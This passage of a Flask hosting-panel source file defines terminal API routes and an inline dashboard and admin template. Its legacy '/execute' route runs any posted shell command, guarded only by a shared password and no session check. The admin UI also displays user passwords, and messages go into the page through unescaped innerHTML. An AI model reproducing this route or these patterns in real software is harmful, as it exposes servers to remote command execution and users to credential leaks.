    sess = terminal_sessions.get(username)
    if not sess or not sess.is_running():
        return jsonify({'error': 'Terminal not running'}), 400
    sess.write(input_data + '\n')
    return jsonify({'success': True})

@app.route('/api/terminal/read', methods=['GET'])
@login_required
def terminal_read():
    username = session['username']
    sess = terminal_sessions.get(username)
    if not sess:
        return jsonify({'output': '', 'running': False})
    output = sess.read_output()
    running = sess.is_running()
    return jsonify({'output': output, 'running': running})

@app.route('/api/terminal/stop', methods=['POST'])
@login_required
def terminal_stop():
    username = session['username']
    sess = terminal_sessions.get(username)
    if sess:
        sess.stop()
        terminal_sessions.pop(username, None)
    return jsonify({'success': True})

# ---------- OLD TERMINAL ----------
@app.route('/execute', methods=['POST'])
def execute():
    data = request.json
    if data.get('password') != PASSWORD:
        return jsonify({"output": "Access Denied"})
    try:
        result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT, timeout=600)
        return jsonify({"output": result.decode('utf-8')})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Command timed out"})
    except Exception as e:
        return jsonify({"output": str(e)})

# ============================================================
# 📍 MAIN ROUTE - FRONTEND
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{{ website_name }}</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: #05070d; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .view { display: none; width: 100%; max-width: 420px; margin: 0 auto; }
        .view.active { display: block; }
        
        /* Login */
        .login-card { position: relative; width: 100%; padding: 30px 20px; background: #0c1018; border-radius: 25px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,.5); }
        .login-card::before { content: ""; position: absolute; inset: -3px; background: conic-gradient(#00e5ff, transparent, transparent, transparent, #00e5ff); animation: spin 4s linear infinite; }
        .login-card::after { content: ""; position: absolute; inset: 3px; background: #0c1018; border-radius: 22px; }
        .login-content { position: relative; z-index: 2; }
        .login-icon { width: 110px; height: 110px; margin: auto; border: 3px solid #00e5ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; color: #00e5ff; box-shadow: 0 0 20px #00e5ff; overflow: hidden; background: #0c1018; cursor: pointer; transition: transform 0.1s; user-select: none; }
        .login-icon:active { transform: scale(0.95); }
        .login-icon img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
        .login-title { margin: 25px 0; text-align: center; color: #cfffff; letter-spacing: 4px; font-size: 1.3rem; }
        .login-card select, .login-card input { width: 100%; margin: 12px 0; padding: 16px; background: #161b25; border: 1px solid #2b3240; border-radius: 15px; color: white; font-size: 16px; outline: none; }
        .login-btn { width: 100%; margin-top: 20px; padding: 16px; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; color: white; cursor: pointer; background: linear-gradient(90deg, #7a00ff, #00d9ff); transition: opacity 0.2s; }
        .login-btn:hover { opacity: .9; }
        .login-error { color: #ff4d4d; text-align: center; font-size: 14px; margin-top: 10px; min-height: 22px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%,100% { transform: translateX(0); } 10%,30%,50%,70%,90% { transform: translateX(-10px); } 20%,40%,60%,80% { transform: translateX(10px); } }
        .shake { animation: shake 0.5s; }
        @keyframes loginSuccess { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
        .login-success { animation: loginSuccess 0.4s ease; }

        /* Dashboard */
        .user-container { max-width: 400px; width: 100%; margin: 0 auto; }
        .user-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .user-title { letter-spacing: 3px; font-weight: 800; font-size: 1.2rem; }
        .hamburger { font-size: 28px; cursor: pointer; color: #fff; padding: 4px 8px; border-radius: 8px; user-select: none; }
        .hamburger:hover { background: rgba(255,255,255,0.08); }
        .power-btn { color: #ff4d4d; font-size: 20px; cursor: pointer; }
        .user-header-left { display: flex; align-items: center; gap: 12px; }
        
        /* Tabs */
        .tabs { display: flex; gap: 10px; margin: 15px 0 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
        .tab-btn { background: transparent; border: none; color: #888; font-size: 1rem; font-weight: 700; padding: 8px 16px; cursor: pointer; transition: .3s; border-radius: 10px; }
        .tab-btn:hover { color: #fff; background: rgba(255,255,255,0.05); }
        .tab-btn.active { color: #00e5ff; background: rgba(0,229,255,0.1); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* Upload Cards */
        .upload-card { border: 1px dashed #00e5ff; border-radius: 15px; padding: 20px; text-align: center; background: rgba(0,229,255,0.05); cursor: pointer; margin-bottom: 15px; }
        .cloud-icon { font-size: 40px; margin-bottom: 10px; color: #00e5ff; }
        .upload-card>div:nth-child(3) { color: #aaa; font-size: 14px; }
        .deploy-btn { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-weight: 900; margin-top: 15px; text-transform: uppercase; cursor: pointer; border: none; width: 100%; font-size: 14px; }
        .deploy-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        #fileCountDisplay { font-size: 12px; color: #888; margin-top: 8px; }

        /* Bot/Website Cards */
        #botListContainer, .website-grid { margin-top: 20px; display: flex; flex-direction: column; gap: 16px; }
        .bot-card, .website-card { background: #111; border: 1px solid #333; border-radius: 15px; padding: 15px; transition: border-color 0.2s; cursor: pointer; }
        .bot-card:hover, .website-card:hover { border-color: #555; }
        .bot-card.selected, .website-card.selected { border-color: #00e5ff; }
        .bot-header, .website-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .bot-name, .website-name { font-weight: bold; font-size: 16px; }
        .bot-status { font-size: 12px; padding: 2px 12px; border-radius: 12px; font-weight: bold; }
        .bot-status.running { background: #00ff6a33; color: #00ff6a; border: 1px solid #00ff6a; }
        .bot-status.stopped, .bot-status.failed, .bot-status.crashed { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
        .bot-uptime { font-size: 12px; color: #888; margin-bottom: 10px; font-family: monospace; }
        .bot-owner { font-size: 11px; color: #888; margin-bottom: 8px; }
        .bot-controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .bot-controls button { border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 12px; transition: background 0.2s; }
        .bot-controls button:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-start { background: #00d4ff; color: #000; }
        .btn-stop { background: #ff4d4d; color: #fff; }
        .btn-edit { background: #4d88ff; color: #fff; }
        .btn-restart { background: #ffaa00; color: #000; }
        .btn-download { background: #2ecc71; color: #000; }
        .btn-delete { background: #400; color: #fff; }
        .btn-openbot { background: #1da1f2; color: #fff; grid-column: span 2; padding: 10px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
        .btn-openbot:hover { background: #1a8cd8; }

        .website-startup-file { font-size: 11px; color: #888; font-family: monospace; margin: 2px 0; }
        .website-slug { color: #888; font-size: 0.9rem; margin: 3px 0; }
        .website-port { color: #888; font-size: 0.8rem; }
        .website-actions { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-top: 10px; }
        .website-actions button { padding: 8px 10px; border: none; border-radius: 8px; font-size: 0.7rem; font-weight: 600; cursor: pointer; transition: .2s; }
        .website-actions button:hover { transform: scale(1.05); }
        .btn-start-w { background: #00d4ff33; color: #00d4ff; border: 1px solid #00d4ff55; }
        .btn-start-w:hover { background: #00d4ff; color: #000; }
        .btn-stop-w { background: #ff4d4d33; color: #ff4d4d; border: 1px solid #ff4d4d55; }
        .btn-stop-w:hover { background: #ff4d4d; color: #fff; }
        .btn-restart-w { background: #ffaa0033; color: #ffaa00; border: 1px solid #ffaa0055; }
        .btn-restart-w:hover { background: #ffaa00; color: #000; }
        .btn-delete-w { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
        .btn-delete-w:hover { background: #ff4d4d; color: #fff; }
        .btn-edit-w { background: #4d88ff33; color: #4d88ff; border: 1px solid #4d88ff55; }
        .btn-edit-w:hover { background: #4d88ff; color: #fff; }
        .btn-download-w { background: #2ecc7133; color: #2ecc71; border: 1px solid #2ecc7155; }
        .btn-download-w:hover { background: #2ecc71; color: #000; }
        .btn-files-w { background: rgba(255,255,255,0.1); color: #aaa; border: 1px solid #333; }
        .btn-files-w:hover { background: rgba(255,255,255,0.2); color: #fff; }
        .btn-buildlogs-w { background: #ffa50033; color: #ffa500; border: 1px solid #ffa50055; }
        .btn-buildlogs-w:hover { background: #ffa500; color: #000; }
        .btn-visit-w { background: #00e5ff; color: #000; padding: 8px 16px; border-radius: 12px; text-decoration: none; font-weight: bold; display: inline-block; width: 100%; text-align: center; border: none; cursor: pointer; margin-bottom: 8px; font-size: 14px; }
        .btn-visit-w:hover { background: #00d4f0; transform: scale(1.02); }
        .visit-btn-container { margin-bottom: 8px; }
        .name-edit { display: flex; gap: 8px; margin-top: 12px; }
        .name-edit input { flex: 1; padding: 8px 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; outline: none; font-size: 0.85rem; }
        .name-edit input:focus { border-color: #00e5ff; }
        .name-edit button { padding: 8px 16px; background: #00e5ff; border: none; border-radius: 12px; color: #000; font-weight: 600; cursor: pointer; }

        .console-wrapper { display: flex; align-items: stretch; gap: 8px; margin-top: 15px; }
        .console { background: #000; color: #00ff6a; padding: 10px; font-family: monospace; font-size: 10px; border-radius: 8px; height: 100px; overflow-y: auto; border: 1px solid #333; line-height: 1.6; white-space: pre-wrap; flex: 1; }

        .user-footer { text-align: center; margin-top: 30px; }
        .f-title { font-size: 22px; font-weight: 900; letter-spacing: 5px; }
        .f-sub { font-size: 11px; opacity: 0.6; margin-bottom: 15px; }
        .social-box { display: flex; justify-content: center; gap: 20px; }
        .social-box a { color: #fff; font-size: 20px; width: 40px; height: 40px; border: 1px solid #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; transition: border-color 0.2s; }
        .social-box a:hover { border-color: #00e5ff; }

        /* Admin Drawer */
        .admin-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 999; justify-content: flex-end; animation: fadeIn 0.25s ease; }
        .admin-overlay.open { display: flex; }
        .admin-drawer { width: 100%; max-width: 480px; height: 100%; background: #0c1018; padding: 24px 20px; overflow-y: auto; box-shadow: -10px 0 30px rgba(0,0,0,0.8); animation: slideIn 0.3s ease; display: flex; flex-direction: column; }
        .admin-drawer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid #222; }
        .admin-drawer-header h2 { color: #00e5ff; font-size: 1.2rem; letter-spacing: 2px; }
        .admin-close-btn { background: none; border: none; color: #ff4d4d; font-size: 28px; cursor: pointer; padding: 0 6px; }
        .admin-tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .admin-tabs button { flex: 1; padding: 12px; border: 1px solid #333; border-radius: 10px; background: transparent; color: #aaa; font-weight: bold; font-size: 13px; cursor: pointer; transition: all 0.2s; min-width: 80px; }
        .admin-tabs button.active { background: #00e5ff22; border-color: #00e5ff; color: #00e5ff; }
        .admin-tabs button:hover { border-color: #555; }
        .admin-panel-content { flex: 1; }
        .admin-tab-content { display: none; }
        .admin-tab-content.active { display: block; }

        /* User Cards */
        .list-item { background: #111; border: 1px solid #2a2a2a; border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; display: flex; flex-direction: column; gap: 10px; }
        .list-item .row { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
        .list-item .row .info { flex: 1; min-width: 120px; }
        .list-item .info .uname { font-weight: 700; font-size: 15px; color: #fff; }
        .list-item .info .upass { font-size: 13px; color: #888; font-family: monospace; }
        .badge-role { font-size: 10px; padding: 2px 10px; border-radius: 20px; font-weight: bold; text-transform: uppercase; white-space: nowrap; }
        .badge-role.admin { background: #00e5ff33; color: #00e5ff; border: 1px solid #00e5ff55; }
        .badge-role.user { background: #444; color: #ccc; border: 1px solid #555; }
        .badge-role.banned { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
        .limit-group { display: flex; align-items: center; gap: 6px; }
        .limit-group label { color: #aaa; font-size: 13px; font-weight: bold; }
        .list-item .limit-input { width: 70px; background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 8px 6px; border-radius: 5px; font-size: 13px; outline: none; text-align: center; }
        .btn-action { border: none; cursor: pointer; font-weight: bold; border-radius: 5px; padding: 8px 14px; font-size: 12px; white-space: nowrap; }
        .btn-set { background: #00e5ff33; color: #00e5ff; border: 1px solid #00e5ff55; }
        .btn-ban { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
        .btn-reset { background: #333; color: #fff; border: 1px solid #555; }
        .btn-del { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; width: 100%; padding: 10px; text-align: center; }
        .btn-create { background: #00e5ff; color: #000; border: none; padding: 10px 18px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 13px; }
        .btn-create:hover { opacity: 0.9; }
        .section-title { color: #00e5ff; font-size: 14px; font-weight: bold; margin: 18px 0 10px 0; border-bottom: 1px solid #222; padding-bottom: 6px; }
        .empty-msg { text-align: center; color: #555; padding: 20px 0; font-size: 14px; }

        /* Terminal */
        .terminal-box { background: #010409; color: #50fa7b; height: 350px; overflow-y: scroll; padding: 12px; border: 1px solid #30363d; font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; border-radius: 6px; margin-bottom: 10px; line-height: 1.6; }
        .terminal-controls { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
        .terminal-controls input { flex: 1; background: #0d1117; border: 1px solid #30363d; color: white; padding: 14px; border-radius: 6px; font-size: 16px; outline: none; min-width: 150px; }
        .terminal-controls input:focus { border-color: #00e5ff; }
        .terminal-controls button { padding: 12px 20px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 14px; }
        .btn-term-run { background: #238636; color: white; }
        .btn-term-stop { background: #da3633; color: white; }
        .btn-term-clear { background: #555; color: white; }

        /* Modal */
        .custom-modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10001; justify-content: center; align-items: center; animation: fadeIn 0.2s ease; }
        .custom-modal-overlay.open { display: flex; }
        .custom-modal { background: #0c1018; border: 1px solid #2a2a2a; border-radius: 20px; padding: 30px 28px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.8); text-align: left; }
        .custom-modal .modal-icon { font-size: 40px; margin-bottom: 12px; text-align: center; color: #00e5ff; }
        .custom-modal .modal-body { color: #eee; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
        .custom-modal .modal-body textarea { width: 100%; background: #050807; color: #00ff88; border: 1px solid #333; border-radius: 6px; padding: 10px; font-family: 'Courier New', monospace; font-size: 0.7rem; resize: vertical; tab-size: 4; min-height: 200px; }
        .custom-modal .modal-actions { display: flex; gap: 12px; justify-content: flex-end; flex-wrap: wrap; }
        .custom-modal .modal-actions button { padding: 12px 28px; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; min-width: 100px; transition: background 0.2s; }
        .custom-modal .modal-actions .btn-confirm { background: #00e5ff; color: #000; }
        .custom-modal .modal-actions .btn-cancel { background: #333; color: #fff; border: 1px solid #555; }
        .custom-modal .modal-actions .btn-ok { background: #00e5ff; color: #000; width: 100%; }
        .custom-modal .modal-body .btn-sm { padding: 6px 14px; font-size: 0.55rem; border: 1px solid #33ddff; color: #33ddff; background: transparent; border-radius: 6px; cursor: pointer; }

        /* Settings Modal */
        .settings-form label { display: block; color: #aaa; font-size: 13px; margin-top: 15px; margin-bottom: 4px; }
        .settings-form input[type="text"], .settings-form input[type="file"] { width: 100%; background: #161b25; border: 1px solid #2b3240; color: white; padding: 12px; border-radius: 8px; outline: none; font-size: 14px; }
        .settings-form input:focus { border-color: #00e5ff; }
        .settings-form .logo-preview { margin-top: 10px; max-width: 100px; max-height: 100px; border-radius: 50%; border: 2px solid #00e5ff; }
        .settings-form .btn-remove-logo { background: #ff3333; color: #fff; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; margin-top: 8px; }

        /* Stats */
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
        .stat-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 15px; padding: 15px; text-align: center; }
        .stat-card .label { color: #888; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
        .stat-card .value { font-size: 1.6rem; font-weight: bold; color: #00e5ff; margin: 5px 0; }
        .stat-card .sub { color: #666; font-size: 0.8rem; }
        .stat-card .progress-bar { width: 100%; height: 6px; background: #1a1a1a; border-radius: 4px; margin-top: 8px; overflow: hidden; }
        .stat-card .progress-bar .fill { height: 100%; background: linear-gradient(90deg,#7a00ff,#00e5ff); border-radius: 4px; transition: width 0.5s; }
        .offset-section { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; margin-top: 15px; }
        .offset-section label { color: #aaa; }
        .offset-section .offset-input { display: flex; gap: 10px; margin-top: 5px; }
        .offset-section .offset-input input { flex: 1; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 10px; color: #fff; }
        .offset-section .offset-input button { background: #00e5ff; border: none; border-radius: 8px; padding: 10px 20px; color: #000; font-weight: 700; cursor: pointer; }

        @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
        @keyframes slideIn { 0% { transform: translateX(60px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #0c1018; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
        @media (max-width: 480px) { .admin-drawer { max-width: 100%; padding: 18px 14px; } .list-item .row { flex-direction: column; align-items: stretch; } .admin-tabs button { font-size: 11px; padding: 8px; } .bot-controls { grid-template-columns: 1fr 1fr; } .website-actions { grid-template-columns: 1fr 1fr 1fr; } .stats-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>

    <!-- ===== LOGIN ===== -->
    <div id="loginView" class="view active">
        <div class="login-card">
            <div class="login-content">
                <div class="login-icon" id="loginIcon"><i class="fa-solid fa-user"></i></div>
                <h1 class="login-title">{{ website_name }}</h1>
                <select id="loginRoleSelect"><option value="user">USER ACCESS</option><option value="admin">Admin</option></select>
                <input type="text" id="loginUsername" placeholder="Enter Username" />
                <input type="password" id="loginPassword" placeholder="Password" />
                <button class="login-btn" id="loginBtn">ACCESS SYSTEM</button>
                <div class="login-error" id="loginError"></div>
            </div>
        </div>
    </div>

    <!-- ===== DASHBOARD ===== -->
    <div id="userView" class="view">
        <div class="user-container">
            <div class="user-header">
                <div class="user-header-left">
                    <span class="hamburger" id="hamburgerBtn">☰</span>
                    <span class="user-title" id="websiteTitle">{{ website_name }}</span>
                </div>
                <div class="power-btn" id="logoutBtn"><i class="fa-solid fa-power-off"></i></div>
            </div>

            <div class="tabs">
                <button class="tab-btn active" data-tab="bots">🤖 Bots</button>
                <button class="tab-btn" data-tab="websites">🌐 Websites</button>
            </div>

            <div id="tab-bots" class="tab-content active">
                <div class="upload-card" id="uploadCardBot">
                    <div class="cloud-icon"><i class="fa-solid fa-robot"></i></div>
                    <div>UPLOAD BOT (ZIP or files)</div>
                    <div class="deploy-btn" id="deployBtnBot">DEPLOY BOT</div>
                    <input type="file" id="fileInputBot" style="display:none;" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl,.json,.txt" />
                    <div id="fileCountDisplayBot"></div>
                </div>
                <div id="botListContainer"></div>
                <div class="console-wrapper"><div class="console" id="botConsole">Select a bot to see logs.</div></div>
            </div>

            <div id="tab-websites" class="tab-content">
                <div class="upload-card" id="uploadCardWebsite">
                    <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
                    <div>UPLOAD WEBSITE (ZIP or files)</div>
                    <div class="deploy-btn" id="deployBtnWebsite">DEPLOY WEBSITE</div>
                    <input type="file" id="fileInputWebsite" style="display:none;" multiple accept=".zip,.py,.js,.html,.css,.json,.txt,.php,.go,.rb,.sh,.pl,.jar,.war,.xml,.gradle" />
                    <div id="fileCountDisplayWebsite"></div>
                </div>
                <div id="websiteGrid" class="website-grid"></div>
                <div class="console-wrapper"><div class="console" id="websiteConsole">Select a website to see logs.</div></div>
            </div>

            <div class="user-footer">
                <div class="f-title" id="footerTitle">{{ website_name }}</div>
                <div class="f-sub">LOVE YOU ALL. SUPPORT KARO</div>
                <div class="social-box">
                    <a href="#" target="_blank" id="socialTelegram"><i class="fa-brands fa-telegram"></i></a>
                    <a href="#" target="_blank" id="socialYoutube"><i class="fa-brands fa-youtube"></i></a>
                    <a href="#" target="_blank" id="socialInstagram"><i class="fa-brands fa-instagram"></i></a>
                    <a href="#" target="_blank" id="socialTiktok"><i class="fa-brands fa-tiktok"></i></a>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== ADMIN DRAWER ===== -->
    <div class="admin-overlay" id="adminOverlay">
        <div class="admin-drawer">
            <div class="admin-drawer-header"><h2><i class="fa-solid fa-shield-halved"></i> ADMIN PANEL</h2><button class="admin-close-btn" id="adminCloseBtn">✕</button></div>
            <div class="admin-tabs">
                <button class="active" data-tab="tabAdminMenu">🛠️ ADMIN</button>
                <button data-tab="tabUserMenu">👥 USERS</button>
                <button data-tab="tabTerminal">💻 TERMINAL</button>
                <button data-tab="tabStats">📊 STATS</button>
            </div>
            <div class="admin-panel-content">
                <div id="tabAdminMenu" class="admin-tab-content active">
                    <button class="btn-create" id="toggleCreateUserBtn" style="width:100%;margin-bottom:12px;"><i class="fa-solid fa-plus"></i> NEW USER</button>
                    <button class="btn-create" id="editProfileBtn" style="width:100%;margin-bottom:12px;background:#4d88ff;"><i class="fa-solid fa-user-edit"></i> EDIT PROFILE</button>
                    <button class="btn-create" id="settingsBtn" style="width:100%;margin-bottom:12px;background:#ffaa00;"><i class="fa-solid fa-gear"></i> SETTINGS</button>
                    <div id="createUserForm">
                        <input type="text" id="newUsername" placeholder="Username" />
                        <input type="password" id="newPassword" placeholder="Password" />
                        <input type="text" id="newExpiry" placeholder="Expiry (Days)" />
                        <select id="newRole"><option value="user">User</option><option value="admin">Admin</option></select>
                        <button class="btn-create" id="createUserBtn" style="width:100%;">CREATE</button>
                    </div>
                    <div id="fullUserListContainer"></div>
                </div>
                <div id="tabUserMenu" class="admin-tab-content">
                    <div class="section-title">👑 Admin List</div><div id="simpleAdminListContainer"></div>
                    <div class="section-title">👤 User List</div><div id="simpleUserListContainer"></div>
                </div>
                <div id="tabTerminal" class="admin-tab-content">
                    <div class="terminal-box" id="terminalOutput"><span>$ </span>Connected...<br /></div>
                    <div class="terminal-controls">
                        <input type="text" id="terminalCommand" placeholder="Type command..." />
                        <button class="btn-term-run" id="termRunBtn"><i class="fa-solid fa-play"></i> Run</button>
                        <button class="btn-term-stop" id="termStopBtn"><i class="fa-solid fa-stop"></i> Stop</button>
                        <button class="btn-term-clear" id="termClearBtn"><i class="fa-solid fa-eraser"></i> Clear</button>
                    </div>
                </div>
                <div id="tabStats" class="admin-tab-content">
                    <div class="stats-grid">
                        <div class="stat-card"><div class="label">Total Hours</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
                        <div class="stat-card"><div class="label">Main Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
                        <div class="stat-card"><div class="label">Internal Sites</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
                        <div class="stat-card"><div class="label">Render Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
                        <div class="stat-card"><div class="label">Storage Used</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
                        <div class="stat-card"><div class="label">Container RAM</div><div class="value" id="statRam">--</div><div class="sub"><span id="statRamUsed">--</span> MB / <span id="statRamTotal">--</span> MB</div><div class="progress-bar"><div class="fill" id="ramFill" style="width:0%;"></div></div></div>
                        <div class="stat-card"><div class="label">CPU Usage</div><div class="value" id="statCpu">--</div><div class="sub">Percent</div></div>
                    </div>
                    <div class="offset-section">
                        <label>🔧 Set Offset (Total Hours from Render Dashboard)</label>
                        <div class="offset-input">
                            <input type="number" id="offsetInput" step="0.01" placeholder="e.g. 52.30" />
                            <button id="setOffsetBtn">SET OFFSET</button>
                        </div>
                        <div style="font-size:0.75rem;color:#666;margin-top:5px;">Render Dashboard → Usage → Total Hours Used so far.</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== MODALS ===== -->
    <div class="custom-modal-overlay" id="customModalOverlay">
        <div class="custom-modal">
            <div class="modal-icon" id="modalIcon">⚠️</div>
            <div class="modal-body" id="modalBody"></div>
            <div class="modal-actions" id="modalActions"></div>
        </div>
    </div>

    <div class="custom-modal-overlay" id="settingsModalOverlay">
        <div class="custom-modal">
            <div class="modal-icon"><i class="fa-solid fa-gear"></i></div>
            <div class="modal-body" id="settingsModalBody">
                <div class="settings-form">
                    <label>Website Name</label><input type="text" id="settingsWebsiteName" />
                    <label>Telegram Link</label><input type="text" id="settingsTelegram" />
                    <label>YouTube Link</label><input type="text" id="settingsYoutube" />
                    <label>Instagram Link</label><input type="text" id="settingsInstagram" />
                    <label>TikTok Link</label><input type="text" id="settingsTiktok" />
                    <label>Upload Logo</label><input type="file" id="settingsLogoInput" accept="image/*" />
                    <div id="settingsLogoPreview"></div>
                    <button class="btn-remove-logo" id="settingsRemoveLogoBtn">Remove Logo</button>
                </div>
            </div>
            <div class="modal-actions">
                <button class="btn-cancel" id="settingsCancelBtn">Cancel</button>
                <button class="btn-confirm" id="settingsSaveBtn">Save Settings</button>
            </div>
        </div>
    </div>

    <script>
    (function(){
        'use strict';

        // ----- API HELPERS -----
        async function apiCall(url, options = {}) {
            const res = await fetch(url, {
                ...options,
                headers: { 'Content-Type': 'application/json', ...options.headers }
            });
            if (!res.ok) {
                const err = await res.json().catch(() => ({}));
                throw new Error(err.error || 'API error');
            }
            return res.json();
        }

        // ----- CUSTOM MODAL -----
        const modalOverlay = document.getElementById('customModalOverlay');
        const modalIcon = document.getElementById('modalIcon');
        const modalBody = document.getElementById('modalBody');
        const modalActions = document.getElementById('modalActions');

        function showCustomModal(icon, bodyHTML, buttons) {
            return new Promise((resolve) => {
                modalIcon.textContent = icon || '⚠️';
                modalBody.innerHTML = bodyHTML || '';
                modalActions.innerHTML = '';
                buttons.forEach((btn) => {
                    const buttonEl = document.createElement('button');
                    buttonEl.textContent = btn.label;
                    buttonEl.className = btn.className || 'btn-confirm';
                    buttonEl.addEventListener('click', () => {
                        closeModal();
                        resolve(btn.value);
                    });
                    modalActions.appendChild(buttonEl);
                });
                modalOverlay.classList.add('open');
            });
        }

        window.customAlert = function(message, icon = 'ℹ️') {
            return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
                { label: 'OK', value: true, className: 'btn-ok' }
            ]);
        };

        window.customConfirm = function(message, icon = '⚠️') {
            return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
                { label: 'Cancel', value: false, className: 'btn-cancel' },
                { label: 'OK', value: true, className: 'btn-confirm' }
            ]);
        };

        function closeModal() { modalOverlay.classList.remove('open'); }

        // ----- DOM REFS -----
        const loginView = document.getElementById('loginView');
        const userView = document.getElementById('userView');
        const adminOverlay = document.getElementById('adminOverlay');
        const loginUsername = document.getElementById('loginUsername');
        const loginPassword = document.getElementById('loginPassword');
        const loginRoleSelect = document.getElementById('loginRoleSelect');
        const loginBtn = document.getElementById('loginBtn');
        const loginError = document.getElementById('loginError');
        const hamburgerBtn = document.getElementById('hamburgerBtn');
        const adminCloseBtn = document.getElementById('adminCloseBtn');
        const logoutBtn = document.getElementById('logoutBtn');
        const botListContainer = document.getElementById('botListContainer');
        const botConsole = document.getElementById('botConsole');
        const websiteGrid = document.getElementById('websiteGrid');
        const websiteConsole = document.getElementById('websiteConsole');
        const deployBtnWebsite = document.getElementById('deployBtnWebsite');
        const fileInputWebsite = document.getElementById('fileInputWebsite');
        const fileCountDisplayWebsite = document.getElementById('fileCountDisplayWebsite');
        const uploadCardWebsite = document.getElementById('uploadCardWebsite');
        const deployBtnBot = document.getElementById('deployBtnBot');
        const fileInputBot = document.getElementById('fileInputBot');
        const fileCountDisplayBot = document.getElementById('fileCountDisplayBot');
        const uploadCardBot = document.getElementById('uploadCardBot');
        const fullUserListContainer = document.getElementById('fullUserListContainer');
        const simpleAdminListContainer = document.getElementById('simpleAdminListContainer');
        const simpleUserListContainer = document.getElementById('simpleUserListContainer');
        const toggleCreateUserBtn = document.getElementById('toggleCreateUserBtn');
        const createUserForm = document.getElementById('createUserForm');
        const newUsername = document.getElementById('newUsername');
        const newPassword = document.getElementById('newPassword');
        const newExpiry = document.getElementById('newExpiry');
        const newRole = document.getElementById('newRole');
        const createUserBtn = document.getElementById('createUserBtn');
        const terminalOutput = document.getElementById('terminalOutput');
        const terminalCommand = document.getElementById('terminalCommand');
        const termRunBtn = document.getElementById('termRunBtn');
        const termStopBtn = document.getElementById('termStopBtn');
        const termClearBtn = document.getElementById('termClearBtn');
        const settingsBtn = document.getElementById('settingsBtn');
        const settingsModalOverlay = document.getElementById('settingsModalOverlay');
